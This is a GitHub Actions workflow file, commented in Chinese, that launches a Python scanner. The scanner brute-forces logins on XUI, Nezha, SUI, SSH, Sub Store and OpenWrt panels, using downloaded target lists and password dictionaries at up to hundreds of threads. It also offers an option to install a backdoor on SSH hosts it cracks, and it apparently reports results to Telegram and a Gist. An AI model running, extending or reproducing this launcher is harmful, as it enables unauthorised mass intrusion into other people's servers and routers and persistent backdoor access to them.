# .github/workflows/scanner.yml
name: Run Scanner Script

on:
  workflow_dispatch:
    inputs:
      template_mode:
        description: '爆破模式 (1-8)'
        required: true
        default: '1'
        type: choice
        options:
          - '1' # XUI
          - '2' # 哪吒
          - '3' # HUI
          - '4' # 咸蛋
          - '5' # SUI
          - '6' # SSH
          - '7' # Sub Store
          - '8' # OpenWrt/iStoreOS
      input_file_url:
        description: '源文件下载地址 (例如 1.txt)'
        required: true
        default: 'https://example.com/path/to/1.txt'
      lines_per_file:
        description: '每个小文件行数'
        required: true
        default: '5000'
      semaphore_size:
        description: '爆破线程数'
        required: true
        default: '250'
      use_custom_dict:
        description: '是否使用自定义字典 (true/false)'
        required: true
        default: 'false'
        type: choice
        options:
          - 'false'
          - 'true'
      install_backdoor:
        description: '是否安装后门 (仅模式6有效, true/false)'
        required: true
        default: 'false'
        type: choice
        options:
          - 'false'
          - 'true'
      # 如果需要，可以添加更多输入选项，例如自定义字典的URL

jobs:
  run-scanner:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi

      - name: Download input file
        run: |
          # 从输入参数获取URL并下载，保存为 1.txt
          curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
          echo "源文件下载完成。"

      # 如果使用自定义字典，可以在这里添加下载字典的步骤
      # - name: Download custom dictionaries
      #   if: github.event.inputs.use_custom_dict == 'true'
      #   run: |
      #     curl -L -o username.txt "URL_TO_USERNAME.TXT"
      #     curl -L -o password.txt "URL_TO_PASSWORD.TXT"
      
      - name: Run Python script
        env:
          # 将 Actions 输入参数和 Secrets 传递给脚本的环境变量
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE: "1.txt" # 我们已经将下载的文件命名为 1.txt
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
          
          # 从仓库 Secrets 中读取敏感信息
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }} # 注意这里用 GIST_TOKEN
          
        run: python main.py
